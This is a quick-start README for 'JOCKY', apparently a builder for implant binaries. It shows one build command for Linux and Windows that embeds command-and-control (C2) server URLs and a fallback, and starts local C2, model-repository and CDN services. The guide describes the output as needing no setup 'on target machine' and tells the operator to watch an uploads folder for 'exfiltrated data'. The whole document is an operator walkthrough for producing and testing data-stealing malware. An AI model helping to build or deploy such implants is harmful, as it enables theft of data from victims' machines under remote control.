# JOCKY Local Build - Quick Start (30 seconds)

## One Command to Build Everything

```bash
cd /home/incharanew/JOCKY
./scripts/build_local.sh examples/research_chain_linux_production.jky build/local --platform linux
```

That's it! Your binary is ready in `build/local/research_chain_linux_production`.

---

## What Happened Automatically

✅ **Docker services started:**
- C2 Server (localhost:5000)
- Model Repository (localhost:5001)
- CDN Endpoint (localhost:5080)

✅ **Environment variables set:**
- `JOCKY_C2_PRIMARY=http://localhost:5000/api/config`
- `JOCKY_C2_FALLBACK=http://localhost:5000/api/config`
- `JOCKY_MODEL_REPO=http://localhost:5001/models/`
- `JOCKY_BUILD_ID=local_dev_[timestamp]`

✅ **Binary compiled:**
- All configuration embedded inside
- No environment variables needed on target machine
- Ready to run anywhere

---

## Try Running Your Binary

```bash
# Execute the binary
./build/local/research_chain_linux_production

# Watch for exfiltrated data
ls -lah build/uploads/

# Check C2 server logs
docker-compose -f docker-compose.dev.yml logs c2-server
```

---

## Build for Windows

```bash
./scripts/build_local.sh examples/research_chain_linux_production.jky build/local --platform windows
```

Output: `build/local/research_chain_linux_production.exe`

---

## Stop Docker Services

```bash
docker-compose -f docker-compose.dev.yml down
```

---

## Next Build

Just run the build command again. Docker services will auto-start.

```bash
./scripts/build_local.sh examples/research_chain_linux_production.jky build/local --platform linux
```

---

## For More Details

See: [`LOCAL_DEVELOPMENT.md`](LOCAL_DEVELOPMENT.md)

Contains:
- Complete architecture explanation
- Troubleshooting guide
- How to add ML models
- Performance tuning
- Production build instructions
